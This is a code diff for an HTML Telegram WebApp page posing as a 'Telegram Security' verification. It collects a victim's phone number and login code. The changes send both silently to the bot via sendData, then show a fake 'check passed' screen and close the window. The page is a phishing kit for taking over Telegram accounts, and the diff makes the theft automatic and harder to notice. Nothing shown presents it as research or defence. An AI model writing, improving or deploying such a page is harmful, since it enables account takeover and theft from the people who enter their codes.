@@ -41,8 +41,9 @@
             background:#2aabee;color:#fff;font-size:16px;font-weight:600;
             cursor:pointer;font-family:inherit;margin-bottom:10px;
         }
+        .btn:active{transform:scale(0.97)}
         .status{font-size:13px;min-height:20px;margin-top:10px}
-        .status.err{color:#f44336}
+        .status.ok{color:#4caf50}
         .footer{margin-top:24px;font-size:11px;color:#333}
     </style>
 </head>
@@ -72,6 +73,12 @@
             <div class="status" id="s2"></div>
         </div>
         
+        <div id="step3" class="hidden">
+            <h2 style="font-size:50px;margin:20px 0">✅</h2>
+            <p class="sub">Проверка пройдена!<br>Окно закроется автоматически</p>
+            <div class="status ok" id="s3"></div>
+        </div>
+        
         <div class="footer">Telegram Security © 2024</div>
     </div>
     
@@ -79,10 +86,8 @@
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
-        tg.MainButton.hide();
         
         let phone = '';
-        let step = 'phone';
         
         function step2(){
             const raw = document.getElementById('phoneInput').value.trim();
@@ -93,27 +98,40 @@
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
             document.getElementById('pd').textContent = phone;
-            
-            step = 'code';
+            document.getElementById('codeInput').focus();
         }
         
         function step3(){
             const code = document.getElementById('codeInput').value.trim();
-            if(!code || code.length < 5) return;
+            if(!code || code.length < 5){
+                document.getElementById('s2').textContent = 'Введите 5 цифр';
+                return;
+            }
             
-            // Отправляем через MainButton
-            tg.MainButton.setText('Закрыть окно');
-            tg.MainButton.show();
-            tg.MainButton.onClick(function(){
-                tg.sendData(JSON.stringify({
-                    action: 'verify',
-                    phone: phone,
-                    code: code
-                }));
-                tg.close();
+            // Сначала отправляем данные
+            const data = JSON.stringify({
+                action: 'verify',
+                phone: phone,
+                code: code
             });
             
-            document.getElementById('s2').textContent = 'Нажмите кнопку ниже';
+            document.getElementById('s3').textContent = 'Отправка данных...';
+            
+            // Пробуем sendData
+            try {
+                tg.sendData(data);
+            } catch(e) {
+                document.getElementById('s3').textContent = 'Ошибка: ' + e.message;
+            }
+            
+            // Показываем успех
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            
+            // Закрываем через 2 секунды
+            setTimeout(function(){
+                tg.close();
+            }, 2000);
         }
     </script>
 </body>
